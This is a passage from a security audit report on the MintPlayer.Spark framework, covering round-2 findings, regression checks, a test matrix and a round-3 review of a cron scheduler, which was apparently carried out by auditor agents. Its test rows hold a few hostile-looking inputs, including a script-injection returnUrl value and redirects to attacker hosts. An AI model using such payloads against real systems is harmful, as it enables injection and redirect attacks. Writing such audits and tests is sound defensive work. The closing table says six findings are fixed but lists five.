##### R2-M9 — GitHub App private key held as managed `string` for service lifetime

**Where:** `MintPlayer.Spark.Webhooks.GitHub/Services/GitHubInstallationService.cs:115-135`, `Configuration/GitHubWebhooksOptions.cs:38-41`

PEM lingers in the GC heap and is recoverable from a process dump. Import once at startup into an `RSA` cached field; clear the loaded `byte[]` after import.

---

##### R2-M10 — 2FA recovery codes stored plaintext in user document

**Where:** `MintPlayer.Spark.Authorization/Identity/SparkUser.cs:38`, `UserStore.cs:421-431`

EF Core's `IUserTwoFactorRecoveryCodeStore` reference impl hashes; the RavenDB store doesn't. A read-only DB compromise yields all recovery codes for all users. Hash with `PasswordHasher` before storage; redeem by hashing the candidate.

---

##### R2-M11 — OAuth refresh/access tokens stored plaintext

**Where:** `MintPlayer.Spark.Authorization/Identity/SparkUserToken.cs:7`, `UserStore.cs:484-501`, `SparkAuthenticationExtensions.cs:131-138`

Federated OAuth tokens (GitHub, Google) stored verbatim. DB read leak gives the attacker long-lived API access to external systems as every linked user. Protect via `IDataProtector`.

---

##### R2-M12 — `SparkIconRegistry.register()` blindly bypasses HTML sanitizer

**Where:** `node_packages/ng-spark/services/src/spark-icon-registry.ts:16-18`

`bypassSecurityTrustHtml` is applied unconditionally inside the registry. A developer wiring server-supplied SVG (per-tenant branding fetched from JSON) inherits XSS. Either accept only pre-sanitized `SafeHtml` (caller opts in) or parse with a strict allow-list (no `<script>`, no `on*`, no `javascript:`).

---

##### R2-M13 — `SparkClient` replays `Cookie` + `X-XSRF-TOKEN` across cross-origin redirects

**Where:** `MintPlayer.Spark.Client/SparkClient.cs:45-55,82-97` (manual header attachment; default `HttpClient` follows redirects).

Server-to-server callers of `SparkClient` (demo apps, integration tests) leak session + XSRF token to a redirect target. .NET strips `Authorization` on cross-origin redirect since 5.0 but not manually-attached headers. Use a `CookieContainer` bound to `BaseAddress`, or set `AllowAutoRedirect=false` and re-issue with origin checks.

---

##### R2-M14 — `SparkClient` has no response-size or per-request timeout cap

**Where:** `MintPlayer.Spark.Client/SparkClient.cs:45-55`

Hostile/compromised Spark backend returns a multi-GB body; `ReadFromJsonAsync` buffers up to 2 GB; default `HttpClient.Timeout` = 100 s. Slow-drip exhausts process memory. Default `MaxResponseContentBufferSize` to 32 MB, `Timeout` to 30 s.

---

##### R2-M15 — Root `package.json` lists `@mintplayer/ng-spark-auth ^0.0.8` as a dependency *and* as a workspace

**Where:** `package.json:11-31`

Workspace currently wins. A future `npm install --workspaces=false` or precedence change in npm pulls `^0.0.8` from npmjs.org. Dependency-confusion shape: any account-takeover or namespace expiry lets a different uploader own the name. Delete the redundant `dependencies` entry — the workspace mapping is sufficient.

---

##### R2-M16 — Docker base images use floating major tags, no digest pinning

**Where:** `Demo/WebhooksDemo/WebhooksDemo/Dockerfile:1,7`

`mcr.microsoft.com/dotnet/{aspnet,sdk}:10.0`. Each build pulls the latest patch. The Dockerfile comment claims "hermetic" — base image floating contradicts that. Pin to `@sha256:<digest>` and run Dependabot Docker updates.

---

##### R2-M17 — Pre-release `Octokit.GraphQL 0.4.0-beta` in production csprojs

**Where:** `MintPlayer.Spark.Webhooks.GitHub.csproj:40`, `Demo/WebhooksDemo/WebhooksDemo/WebhooksDemo.csproj:14`

Pre-release deps receive less audit scrutiny; the package's last beta is years old. CVE response depends on maintainer cadence. Track an alternative or vendor only the GraphQL fragments needed.

---

##### R2-M18 — `Create` accepts client-supplied `Id`, can flip action to `Edit`

**Where:** `MintPlayer.Spark/Endpoints/PersistentObject/Create.cs:52`, `DatabaseAccess.cs:195`

POST body `{ "Id": "cars/existing", … }` makes `SavePersistentObjectAsync` detect an existing ID and switch the action from `"New"` to `"Edit"`. Combined with R2-H2 (no row-level Edit gate), Edit-without-Read-tightening lets an attacker overwrite via the POST verb. Force `obj.Id = null` on Create regardless of body.

---

##### R2-M19 — `GetPermissions` returns "allowed" for everyone when `AddAuthorization` not wired

**Where:** `MintPlayer.Spark/Endpoints/Permissions/GetPermissions.cs:25-31`

Round-1 M-1 disposition: "anon mutations correctly denied". Only true if `AddAuthorization` is wired. R2-H1 (`PermissionService` fail-open) means `canCreate/canEdit/canDelete = true` is returned to anon callers on hosts without the auth package. Cap anonymous response to all-false regardless of underlying default.

---

#### LOW

---

##### R2-L1 — Demo `docker-compose.yml` ships RavenDB with `UnsecuredAccessAllowed=PublicNetwork`

`Demo/WebhooksDemo/docker-compose.yml:5-13`. Container on the `web` Traefik network; one misrouted ingress and the DB is administered with no auth. Switch to `PrivateNetwork` and bind to the internal Docker network only.

---

##### R2-L2 — `ClaimsGroupMembershipProvider` honors every `role`/`group` claim verbatim

`MintPlayer.Spark.Authorization/Services/ClaimsGroupMembershipProvider.cs:19-44`. Today no path injects external role claims — but `AddJwtBearer` or `ClaimActions` from an integrator wires this open. Namespace external claims by issuer or require an allow-list mapping.

---

##### R2-L3 — `OnFileChanged` in `SecurityConfigurationLoader` claims to debounce but doesn't

`MintPlayer.Spark.Authorization/Services/SecurityConfigurationLoader.cs:103-111`. Rapid FS events stack `Task.Delay` continuations. Replace with a `Timer`-based debounce; cancel pending refreshes on dispose.

---

##### R2-L4 — Auth interceptor leaks full URL (including query/fragment) into `returnUrl`

`node_packages/ng-spark-auth/interceptors/src/spark-auth.interceptor.ts:17-21`. Same-origin only, so not exfiltration — but in-app draft text / search queries / document IDs land in login URL access logs. Drop query/fragment before forming `returnUrl`.

---

##### R2-L5 — `SparkClient.UpdateCookiesFromResponse` ignores `Domain`, `Path`, `Secure`, `HttpOnly`

`MintPlayer.Spark.Client/SparkClient.cs:451-473`. Server can set cookies for any host the client jar sees. Use a `CookieContainer` bound to `BaseAddress`, or validate `Domain` matches the request host.

---

##### R2-L6 — `EtlTaskManager.DeployAsync` echoes `ex.Message` to the caller

`MintPlayer.Spark.Replication/Services/EtlTaskManager.cs:89-94`. Round-trips RavenDB exception detail to the unauthenticated caller of R2-C1. Generic error code; full exception logged server-side.

---

##### R2-L7 — `DevWebSocketClientService` accepts plain `ws://` URLs (token leak in transit)

`MintPlayer.Spark.Webhooks.GitHub.DevTunnel/Services/WebSocketDevClientService.cs:43-55`. No scheme validation; misconfigured `ws://` sends the developer GitHub PAT in cleartext as the handshake body. Refuse to start unless URL is `wss://` (or `ws://localhost`).

---

##### R2-L8 — LookupReference document IDs allow `name` containing `/`

`MintPlayer.Spark/Services/LookupReferenceService.cs:134,169,208`. Unvalidated `name` interpolated into `LookupReferences/{name}` document IDs. Reject `name` not matching `^[A-Za-z][A-Za-z0-9_-]*$`.

---

##### R2-L9 — Newtonsoft.Json version drift across projects (13.0.3 vs 13.0.4)

`MintPlayer.Spark.Testing.csproj:20` vs the Webhooks/SocketExtensions csprojs. Adopt Central Package Management (`Directory.Packages.props`) to pin consistently.

---

### 9.3 Drift check (round-1 dispositions vs master HEAD)

| ID | Round-1 disposition | Round-2 status | Notes |
|----|---------------------|----------------|-------|
| H-1 | Address | **INTACT** | All 5 metadata endpoints (`EntityTypes/List`, `EntityTypes/Get`, `Aliases`, `Queries/List`, `Queries/Get`) filter via `IPermissionService.IsAllowedAsync("Query", …)`. **Caveat:** R2-H1 nullifies this on hosts without `AddAuthorization`. |
| H-1b | Address | Not implemented | Per-caller attribute visibility hook never landed. Pairs with R2-H8. |
| H-2 (read path) | Address | **INTACT** | `DatabaseAccess.GetPersistentObjectAsync` + `FilterByRowLevelAuthAsync` enforce row-level Read/Query. |
| H-2 (write path) | (implied by hook) | **REGRESSED / never extended** | See R2-H2 — Edit/Delete never call the hook. |
| H-3 | Address | **INTACT** | `Queries/Execute.cs:97-103` routes parent fetch through the row gate. |
| H-4 | Address now | **NOT ADDRESSED** | See R2-H1. `PermissionService` still no-ops when `accessControl is null`. |
| H-5 | Address | **REGRESSED / never landed** | See R2-H9. No `allowedReturnUrls`, no validator. |
| M-1 | Address with design | **PARTIAL** | Denies anon mutations only when auth is wired; see R2-M19. |
| M-2 | Address (when JWT lands) | N/A | `MapIdentityApi` issues data-protection tokens, not JWTs. Revisit when IdP ships. |
| M-3 | Address | **PARTIAL** | Instance-level path returns 404 (intact); entity-type-level `SparkAccessDeniedException` still returns 403 in `PersistentObject/Get,List.cs`, `Queries/Execute.cs`. Existence-oracle reduced, not eliminated. |
| M-4 | Address | Not implemented | `QueryExecutor.cs:313` still resolves any matching method without `[SparkQuery]`. Documented as deferred. |
| M-5 | Address | **INTACT** | `Queries/Execute.cs:47-78` allow-lists sort columns. |
| M-6 | Address | **REGRESSED** | See R2-M1 — five endpoints still echo `ex.Message`. |
| M-7 | Address | **INTACT** | ETag + side-session check in `DatabaseAccess.cs:208-218`. 409 body leak captured under R2-M1. |
| L-1 | Address (docs) | Not verified | Deployment guide not checked this round. |
| L-2 | Address | **INTACT** | `SparkMiddleware.cs:210` sets `Secure = context.Request.IsHttps`. |
| L-3 | Address (demo-only) | **INTACT** | `SparkBuilderRateLimiterExtensions`, Fleet opts in. |
| L-4 | Address | Not implemented | `CustomActionResolver` still auto-discovers. Documented as deferred. |
| L-5 | Try, else defer | Deferred | Out of scope this round. |
| L-6 | Skip | **Re-opened as R2-C5** | New threat angle: `AdditionalFiles` is untrusted; identifier injection is exploitable at build time. |
| L-7a/b | Address | **NOT ADDRESSED, severity upgraded** | See R2-H8. |

### 9.4 Considered-and-dismissed (round 2)

- **RavenDB raw-query injection in `MessageSubscriptionWorker`** — initially flagged, downgraded after confirming the only caller-controllable path requires write access to `SparkMessages` collection (which the round-2 audit already covers via R2-C2). Still worth fixing per R2-H6.
- **`SparkClient` TLS cert pinning** — `ServerCertificateCustomValidationCallback` only appears in E2E test infrastructure, not production code.
- **WebSocket protocol downgrade in `SparkStreamingService`** — `spark-streaming.service.ts:79-94` correctly maps `https→wss`.
- **`pull_request_target` misuse in CI** — no such triggers exist (re-verified).
- **No `postinstall`/`preinstall` scripts in any project `package.json`** — confirmed clean.
- **`Newtonsoft.Json` known CVEs** — versions in use (13.0.3/4) have no current CVE; the drift is hardening only (R2-L9).
- **Source-generated translation literals** — `LibraryTranslationsProducer.BuildCSharpStringLiteral` and `HostTranslationsAggregatorProducer.Literal` properly escape `"`, `\`, control chars. Not affected by R2-C5.
- **Identity-protected paths in `SparkFull` source generator path** — `SparkFullGenerator.Producer.cs:92-93` chains `AddAuthentication` when a `SparkUser` subclass is detected; the bare `AddSpark` path (R2-H1) is the gap.

### 9.5 Test matrix (round 2)

Same convention as §6: each test asserts the *secure expected behavior*. Tests fail initially against current master; failing == finding confirmed.

#### HTTP-level

| # | Finding | Test name | Assertion |
|---|---------|-----------|-----------|
| R1 | R2-C1 | `Unauth_post_etl_deploy_is_refused` | `POST /spark/etl/deploy` unauth → 401; `documentStore.Maintenance` not invoked |
| R2 | R2-C2 | `Unauth_post_sync_apply_is_refused` | `POST /spark/sync/apply` unauth → 401; entity unchanged |
| R3 | R2-C3 | `Webhook_with_empty_secret_rejects_signed_body` | `VerifySignature(null, "", "body")` → false; signed-with-other-secret → false |
| R4 | R2-C3 | `Webhook_signature_compare_is_timing_safe` | Comparison routes through `FixedTimeEquals` (mockable seam) |
| R5 | R2-C4 | `External_login_callback_rejects_external_returnUrl` | `?returnUrl=//attacker` → response body scripts to `defaultRedirectUrl` |
| R6 | R2-C4 | `External_login_callback_html_encodes_returnUrl` | `?returnUrl='%3balert(1)%2f%2f` → no unencoded `'`/`<` in script |
| R7 | R2-C5 | `Source_generator_rejects_invalid_identifier_in_model_json` | Crafted JSON name fails build with diagnostic |
| R8 | R2-H1 | `Spark_without_AddAuthorization_fails_closed` | Host without `AddAuthorization` either fails at `Build()` or rejects `/spark/po/...` |
| R9 | R2-H2 | `User_B_cannot_PUT_User_As_record` | Row-gate's `Edit` denial → 404; doc unchanged |
| R10 | R2-H2 | `User_B_cannot_DELETE_User_As_record` | Same for DELETE |
| R11 | R2-H3 | `Identity_API_requires_xsrf_on_2fa_disable` | Cross-origin `POST /spark/auth/manage/2fa` w/o `X-XSRF-TOKEN` → 400/401 |
| R12 | R2-H3 | `Identity_API_requires_xsrf_on_password_change` | Same for `/manage/info` |
| R13 | R2-H4 | `Anonymous_lookupref_mutation_is_refused` | Anon `POST /spark/lookupref/CarStatus` → 401 |
| R14 | R2-H4 | `Low_priv_lookupref_mutation_is_refused` | Auth low-priv → 403 |
| R15 | R2-H5 | `WS_stream_rejects_foreign_origin` | WS upgrade with `Origin: attacker.test` → 403 |
| R16 | R2-H6 | `Sparkmessage_unregistered_type_is_dead_lettered` | `MessageType` not in `IRecipient<T>` set → no `Type.GetType` call |
| R17 | R2-H7 | `Module_registration_refuses_overwrite_of_different_fingerprint` | `RegisterAsync` fails if existing entry has another owner key |
| R18 | R2-H8 | `Update_does_not_modify_isreadonly_attribute` | PUT changing `CreatedBy` — reload unchanged |
| R19 | R2-H8 | `Update_does_not_modify_isvisible_false_attribute` | PUT changing `Role` (invisible) — reload unchanged |
| R20 | R2-H10 | `Cross_reference_breadcrumb_respects_row_authz` | Bob's list of orders referencing private Alice — breadcrumb null |
| R21 | R2-H11 | `External_login_requires_email_verified` | Mocked unverified email → no auto-provision |
| R22 | R2-H12 | `Dev_ws_empty_allowed_users_rejects_all` | `AllowedDevUsers=[]` + any token → 401 |
| R23 | R2-H13 | `WS_read_caps_message_size` | 100 MB frame → close `MessageTooBig` before OOM |
| R24 | R2-H14 | `Rql_queuename_with_backslash_is_rejected` | `\`-containing name rejected |
| R25 | R2-H15 | `Sync_handler_cache_is_bounded_by_schema` | 10K random collection names → cache size = schema set |
| R26 | R2-M1 | `Error_body_does_not_leak_raven_internals_v2` | Force duplicate-key on `lookupref` POST — body free of Raven names |
| R27 | R2-M2 | `Query_execute_take_is_clamped` | `?take=10000000` → clamped page size; DB query paged at driver level |
| R28 | R2-M3 | `External_login_challenge_rejects_external_returnUrl` | Entry point validation matches callback |
| R29 | R2-M4 | `Streaming_socket_closes_on_revoked_permission` | Revoke mid-stream → close frame within N seconds |
| R30 | R2-M5 | `Sync_apply_requires_xsrf_when_authed` | After auth lands, missing `X-XSRF-TOKEN` → 400 |
| R31 | R2-M6 | `Replayed_webhook_delivery_is_idempotent` | Same body+sig twice within dedup window → second is no-op |
| R32 | R2-M18 | `Create_ignores_client_supplied_id` | `POST` with `{Id:"existing"}` does not overwrite |

#### Browser-level (Playwright)

| # | Finding | Test name | Assertion |
|---|---------|-----------|-----------|
| R33 | R2-H9 | `Login_returnUrl_validator_blocks_external` | `/login?returnUrl=//attacker.test` → lands on default |
| R34 | R2-H19 | `Client_operation_navigate_rejects_external` | Stub `navigate` op with external URL — route unchanged |

#### Unit / integration

| # | Finding | Test name | Assertion |
|---|---------|-----------|-----------|
| R35 | R2-C3 | `SignatureService_uses_FixedTimeEquals` | Reflection or mockable seam asserts call |
| R36 | R2-M10 | `Recovery_codes_not_stored_plaintext` | After enrollment, Raven doc free of returned codes verbatim |
| R37 | R2-M11 | `Oauth_tokens_not_stored_plaintext` | Raven `SparkUsers/{id}.Tokens` does not contain `gho_` verbatim |
| R38 | R2-H16 | `Workflow_actions_pinned_to_sha` | Lint job fails CI on any `@v*` ref outside `actions/*` |
| R39 | R2-H18 | `PR_workflow_declares_least_privilege_permissions` | `pull-request.yml` contains `permissions: { contents: read }` |

**~39 tests, 32 of 32 findings covered** (Critical + High + Medium where testable; Low items mostly deployment-config and out of e2e scope).

### 9.6 Triage questions (for the user)

1. **Single PR or staged rollout?** The round-1 PR (#123) bundled fixes + tests. R2 has 5 Criticals and 19 Highs. Recommendation: stage as (a) Critical + the High items that gate other fixes (R2-H1, R2-H2, R2-H8) in one PR with smoke tests; (b) the rest in a follow-up. Alternative: one mega-PR matching round 1's shape.
2. **`R2-H1` (`AddAuthorization` fail-open) framing** — change `PermissionService` default to fail-closed, OR add a startup gate that requires `IAccessControl` registration? Recommendation: fail-closed default + warning log; advanced users opt back into anonymous mode explicitly. (Same shape as the round-1 H-4 disposition, this time actually shipped.)
3. **Replication endpoints auth model** — bearer token (simple, breaks demo) or signed module registration (per R2-H7 fix, more design work)? Cross-module authentication is the right design choice and unblocks R2-C1, R2-C2, R2-H7 together.
4. **`L-7a/L-7b → R2-H8` severity** — round 1 marked these Low; round 2 upgrades to High because R2-C2 makes them remotely exploitable. If R2-C2 is fixed first, R2-H8 returns to Medium. Triage interaction matters.
5. **`R2-H9` (client returnUrl)** — disposition says configurable `allowedReturnUrls`. Reaffirm, or simpler default of "any relative path that doesn't start with `//`"?

Once dispositions are set, the work fits the same shape as `feat/security-audit`: branch per phase, tests-first, e2e + unit assertions.

## 10. Round 3 — Cron-feature audit + rebase drift-check (2026-06-05)

**Status:** Draft — awaiting triage.
**Trigger:** `feat/security-audit-round-2` was rebased onto `master`; exactly one new commit was incorporated — `6beb883 feat(cron): scheduled background jobs (MintPlayer.Spark.Cron) (#156)`. All R2 fix commits (`a48d8c4..7809f92`) now sit on top of it. The cron feature post-dates the round-2 baseline (`d0729ae`) and has **never** been security-audited.
**Scope:** (a) the new `MintPlayer.Spark.Cron` package + its source generator + the AllFeatures wiring change introduced by #156; (b) a drift-check that the rebase did not silently revert any R2 fix.
**Method:** 3 parallel auditor agents — Cron runtime/locking; Cron registration/source-generator/AllFeatures; Cron integration + R2 regression + supply-chain. Findings reconciled against the cited code by the lead, severities adjusted for real-world reachability.
**Threat model:** unchanged from R2 (internet-facing multi-tenant, multi-node cluster).

ID prefix `R3-`.

### 10.1 Route / surface inventory (delta)

The cron package adds **no HTTP endpoint, WebSocket, or other externally-reachable surface** (confirmed — it registers only a `BackgroundService` via `SparkCronExtensions.cs:42`). The only new persisted state is one RavenDB compare-exchange key per job, `cron/{jobName}` (`SparkCronScheduler.cs:144`). Job scheduling is fixed entirely at app-startup (`AddJob` / generated `AddCronJobs()`); there is **no runtime path — authenticated or anonymous — to add, alter, or trigger a job.**

### 10.2 Headline

**No CRITICAL findings. No directly-reachable HIGH findings.** The two highest-impact issues (compare-exchange claim poisoning) require RavenDB compare-exchange **write** access, for which there is no reachable path today (see §10.4) — they are recorded as MEDIUM hardening/observability. The most security-relevant *positive* result: the **R2-C5 build-time-RCE class is NOT repeated** in the cron source generator, and **no R2 fix regressed** in the rebase.

### 10.3 Findings

#### MEDIUM

---

##### R3-M1 — Cron claim value is trusted verbatim: a poisoned/corrupt compare-exchange value silently disables a job forever, logged only at Debug

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed (defect) / reachability gated (see note)

**Where:** `MintPlayer.Spark.Cron/SparkCronScheduler.cs:147-157` (claim), `:150-151` (stale check), `:100-104` (Debug-only skip log)

**Attack scenario / failure mode:** The claim key `cron/{jobName}` holds an ISO-8601 `"O"` timestamp and the stale check is `string.CompareOrdinal(existing, occurrence) >= 0 ⇒ skip`. A single value of `"9999-12-31T23:59:59.9999999Z"` (or any far-future / non-parseable string) makes every node skip every real occurrence indefinitely — the job is silently, permanently suppressed cluster-wide and survives restarts (the value is persisted). The only signal is `LogDebug("… already claimed (likely another node); skipping")`, invisible at production log levels. A security-relevant job (token/lockout/audit-retention sweep) silently never runs. The same Debug-masking hides a lost CAS race.

**Reachability note:** This requires write access to the `cron/*` compare-exchange namespace. Auditor verification found **no reachable path** today: `/spark/sync/apply` and module-registration operate on document collections (never compare-exchange) and are mTLS-gated post-R2-C2; `UserStore` uses a disjoint `EmailReservation*` key namespace. So this is **hardening + observability**, not a directly-exploitable vuln — but a corrupt value from clock skew or operator error produces the same silent-death outcome, which is why it stays MEDIUM.

**Expected secure behavior:** Treat the stored value as untrusted — validate it parses as a UTC timestamp within a sane window before honoring the stale comparison; on parse failure or an implausibly-far-future value, log **Warning** and reclaim rather than silently honoring it. Distinguish "lost a real race" (Debug) from "have not fired in N expected windows / stored value is in the future" (Warning), and expose a last-success heartbeat so a never-firing job is observable.

**Test asserts:** Seed `cron/Job` with a year-2999 `"O"` string (and separately with garbage); assert the next due occurrence is still claimed/run by exactly one node **or** a Warning is emitted — not a silent Debug skip.

---

##### R3-M2 — Invalid or never-occurring cron expression fails silent (job never scheduled), validated only at runtime

**Layer:** Framework · **Testable?** Yes · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark.Cron/ISparkCronBuilder.cs:34-49` (registration validates only `IsNullOrWhiteSpace`); `MintPlayer.Spark.Cron/SparkCronScheduler.cs:47-64` (parse failure logs + `return`s); `:68-83` (never-occurring expression → indefinite 1h re-sleep)

**Attack scenario / failure mode:** Two fail-silent paths. (a) `AddJob<T>("not a cron")`, or a job whose static `CronSchedule` is malformed, passes registration (only whitespace is rejected) and host startup green; at scheduler start `CrontabSchedule.Parse` throws, the loop logs `"Invalid cron expression … the job will not run."` and returns — the job is silently never scheduled. (b) A syntactically-valid but never-occurring expression (e.g. `0 0 30 2 *`, Feb 30) parses fine; `GetNextOccurrence` returns no real future occurrence, so the loop enters an indefinite 1-hour-resleep that never fires (NCrontab's exact return for the impossible-date case should be confirmed by the fix's test, but either branch — throw or sentinel — currently ends in a silent no-run). A typo'd schedule on a security-relevant cleanup/retention job thus quietly never runs.

**Expected secure behavior:** Validate the cron expression at **registration** time in `AddJob` (`CrontabSchedule.TryParse`, fail-fast `ArgumentException`), consistent with the existing whitespace check, so a bad schedule fails the build/startup rather than silently disabling the job. At runtime, detect a "no future occurrence" result and log **Warning** + disable that one loop (leaving other jobs healthy) instead of re-sleeping forever.

**Test asserts:** `AddJob<T>("xyz")` throws `ArgumentException` at registration; a registered `0 0 30 2 *` job logs a Warning and its loop terminates while the scheduler stays healthy for other jobs.

---

##### R3-M3 — `AllowConcurrentRuns` jobs are fire-and-forget with no concurrency cap → unbounded fan-out (self-DoS) when a run overruns its interval

**Layer:** Framework · **Testable?** Indirect · **Confidence:** Likely

**Where:** `MintPlayer.Spark.Cron/SparkCronScheduler.cs:107-112`

**Attack scenario / failure mode:** With `AllowConcurrentRuns = true`, `ExecuteJobAsync` is launched and the returned `Task` is neither awaited nor tracked; the loop immediately schedules the next occurrence. Because the cluster claim is keyed per *occurrence* value, each new occurrence wins its own claim and starts another concurrent run. If `RunAsync` consistently outlasts the interval (a slow job, or one slowed by attacker-induced load), in-flight runs grow without bound — memory/connection/thread exhaustion on the node. There is no `SemaphoreSlim`/cap and outstanding runs are not tracked for graceful shutdown. (Exceptions themselves are safe — `ExecuteJobAsync` wraps its body in try/catch at `:117-133` — so this is fan-out, not unobserved-exception.)

**Expected secure behavior:** Bound in-flight concurrency for `AllowConcurrentRuns` jobs (documented max / `SemaphoreSlim`); skip an occurrence when the cap is exceeded rather than growing unboundedly; track outstanding runs so shutdown can await/cancel them.

**Test asserts:** Configure a concurrent job whose `RunAsync` blocks longer than its interval; assert in-flight runs are capped at a documented maximum rather than one-per-occurrence growth.

#### LOW

---

##### R3-L1 — Cron jobs execute with full DI trust and no authorization principal; privilege boundary undocumented

**Layer:** Framework / Application · **Testable?** No · **Confidence:** Confirmed

**Where:** `MintPlayer.Spark.Cron/SparkCronScheduler.cs:119-123`; `MintPlayer.Spark.Cron/README.md` (omission)

**Failure mode:** Each run resolves the job from a fresh DI scope with an unfiltered `IAsyncDocumentSession`/`IDatabaseAccess`, no `ClaimsPrincipal`, no tenant context, and no `IPermissionService` gate — cron jobs bypass the entire authorization layer that guards the HTTP surface (by design for trusted maintenance work). This is an undocumented privilege boundary: any package that registers an `ISparkCronJob` runs full-trust on every node on a schedule. The guide never states this, and a consumer job that calls `IPermissionService`/`IAccessControl` (which key off the ambient principal) would silently evaluate against an empty/anonymous context.

**Expected secure behavior:** Document explicitly that cron jobs run with no principal and full data access, so registration is treated as a privileged operation; optionally offer an opt-in principal/tenant-scoping hook for multi-tenant deployments. At minimum add a security note to `MintPlayer.Spark.Cron/README.md`.

---

##### R3-L2 — 5-vs-6-field precision heuristic can silently mis-parse a schedule (e.g. 60× frequency)

**Layer:** Framework · **Testable?** Yes · **Confidence:** Likely

**Where:** `MintPlayer.Spark.Cron/SparkCronScheduler.cs:52-57`

**Failure mode:** Precision is chosen purely by counting space-separated fields (`IncludingSeconds = fieldCount == 6`). A registrant who writes `*/30 * * * *` intending "every 30 seconds" silently gets "every 30 minutes" (and a 6-field value meant as 5-field runs 60× more often). For a rate-limit-reset / lockout-sweep job, a 60× frequency or 60× delay is a meaningful misconfiguration with no feedback to the author.

**Expected secure behavior:** Log (Information) the resolved precision and the first computed next-occurrence per job at startup so a precision misread is visible; reject malformed field counts explicitly rather than relying on NCrontab's downstream error.

**Test asserts:** Register `*/30 * * * *` and assert the logged next-occurrence delta is ~30 minutes (documenting the interpretation); a 6-field schedule logs second precision.

---

##### R3-L3 — `SparkCronJobRegistry` is mutated without synchronization

**Layer:** Framework · **Testable?** Indirect · **Confidence:** Confirmed (defect) / not remotely reachable

**Where:** `MintPlayer.Spark.Cron/SparkCronJobRegistry.cs:10,15-23`; `SparkCronExtensions.cs:29-44`

**Failure mode:** `Add` does a non-atomic `Any(...)`-then-`Add(...)` on a plain `List<>`, and `GetOrAddInfrastructure` does an unsynchronized find-or-create on the `IServiceCollection`. DI composition is single-threaded in the normal host path, so this is **not remotely reachable**; only an app that parallelizes module wiring could bypass the duplicate-name guard or tear the list (corrupted registry / duplicate `cron/{jobName}` lock keys — not a privilege bug).

**Expected secure behavior:** Document registration as single-threaded, or guard `Add`/`GetOrAddInfrastructure` with a lock.

### 10.4 Verified clean (Round 3)

- **R2-C5 build-time-RCE class NOT repeated.** `CronJobRegistrationGenerator.Producer.cs` emits exactly one interpolated value — `jobClass.JobTypeName`, a Roslyn `ToDisplayString(FullyQualifiedFormat)` symbol name (`CronJobRegistrationGenerator.cs:39`) — into a fixed `cron.AddJob<{JobTypeName}>();`. The untrusted `name`/`cronSchedule` override strings exist only on the runtime `AddJob(string, string?)` overload, which the generator never calls. No `AdditionalFiles`/JSON feeds this generator (it works off `SyntaxProvider` class declarations). No identifier guard is needed because the input is a compiler-validated symbol, not file content. *(Verified by the lead by reading the producer directly.)*
- **AllFeatures fully-qualified-call change is safe, complete, and symmetric.** `SparkFullGenerator.Producer.cs` emits `global::{RootNamespace}.SparkCronJobsBuilderExtensions.AddCronJobs(spark)`, matching the cron generator's emitted class/method/namespace (both derive `RootNamespace` from `settings.RootNamespace ?? "GeneratedCode"`). `global::`-qualified static-call form removes `using`-ambiguity and can't bind to developer-authored extensions. `AddCronJobs` is emitted **only** when an `ISparkCronJob` implementer exists — no fail-open, no dangling reference.
- **No HTTP / external surface** in the cron package (none registered; demos add no routes).
- **Compare-exchange key isolation.** Repo-wide, compare-exchange is used only by the scheduler (`cron/*`) and `UserStore` (`EmailReservation*`) — disjoint namespaces. No R2 write path (`/spark/sync/apply`, module registration) reaches compare-exchange.
- **Demo jobs inert.** `HeartbeatJob` (DemoApp) and `FleetHeartbeatJob` (Fleet) only `LogInformation(DateTime.UtcNow)` — no sensitive data, no network, no attacker-influenceable input.
- **Supply chain — NCrontab `3.3.3`** pinned exactly (`MintPlayer.Spark.Cron.csproj:36`), no known CVEs, small maintained single-purpose library; consistent with R2's supply-chain dismissals.
- **Claim atomicity, exception isolation, idempotent `AddCron`, fail-closed duplicate-name, `TryAddScoped` lifetime, `SafeDelayAsync` cancellation, non-concurrent overlap suppression, host-clock `MaxSleep` re-evaluation** — all reviewed and correct.

### 10.5 Part A — R2 rebase drift-check

All sampled R2 fixes were read in the **current working tree** and are present and intact — **no regressions from the rebase**:

| R2 ID | Verified at | Status |
|-------|-------------|--------|
| R2-C1 | `MintPlayer.Spark.Replication/Endpoints/EtlDeploy.cs:42-65` (mTLS via `IModuleCertificateValidator`) | INTACT |
| R2-C2 | `MintPlayer.Spark.Replication/Endpoints/SyncApply.cs:40-53` (cert validation before CRUD) | INTACT |
| R2-C3 | `MintPlayer.Spark.Webhooks.GitHub/Services/SignatureService.cs:16-17,36` (fail-closed + `FixedTimeEquals`) | INTACT |
| R2-C4 / M3 / H11 | `…/SparkAuthenticationExtensions.cs` (`SanitizeReturnUrl:237-244`, server-side redirect, `email_verified` gate) | INTACT |
| R2-H1 | `MintPlayer.Spark/Services/PermissionService.cs:13-19` (no null-fail-open; deny-all default) | INTACT |
| R2-H3 | same file `:83-101` (`RequireAntiforgeryToken` on mutating Identity-API routes) | INTACT |
| R2-H6 | `MintPlayer.Spark.Messaging/Services/MessageTypeAllowList.cs` + `MessageSubscriptionWorker.cs:89-107,173-184` (allow-list before `Type.GetType`) | INTACT |

**Verdict:** All sampled R2 fixes intact — no rebase regressions.

### 10.6 Per-finding disposition (ADDRESSED 2026-06-05)

All six findings fixed in `MintPlayer.Spark.Cron` + tests; cron test suite green (23/23).

| ID | Severity | Disposition | Where fixed |
|----|----------|-------------|-------------|
| R3-M1 | Medium | **Fixed.** Stored claim value treated as untrusted — `TryParseClaimValue` + future-skew threshold (`MaxClaimFutureSkew`); unparseable/poison value logs Warning and is reclaimed instead of honored. | `SparkCronScheduler.cs:TryClaimOccurrenceAsync/TryParseClaimValue` |
| R3-M2 | Medium | **Fixed.** `CronScheduleParser.TryParse` fail-fast `ArgumentException` in `AddJob`; runtime `NextOccurrenceUtc` returns null for never-occurring expressions → Warning + that loop disabled (no infinite re-sleep). | `ISparkCronBuilder.cs`, `SparkCronScheduler.cs`, `CronScheduleParser.cs` |
| R3-M3 | Medium | **Fixed.** `SemaphoreSlim(MaxConcurrentRunsPerJob=10)` caps concurrent fan-out (excess occurrences shed with Warning); in-flight runs tracked and drained at shutdown via `Task.WhenAll`. | `SparkCronScheduler.cs:TryRunOnceAsync/RunReleasingAsync` |
| R3-L1 | Low | **Fixed.** New "Security & Trust Model" section documents no-principal full-trust execution. | `MintPlayer.Spark.Cron/README.md` |
| R3-L2 | Low | **Fixed.** Resolved precision + first next-occurrence logged (Information) per job at startup. | `SparkCronScheduler.cs:RunJobLoopAsync` |
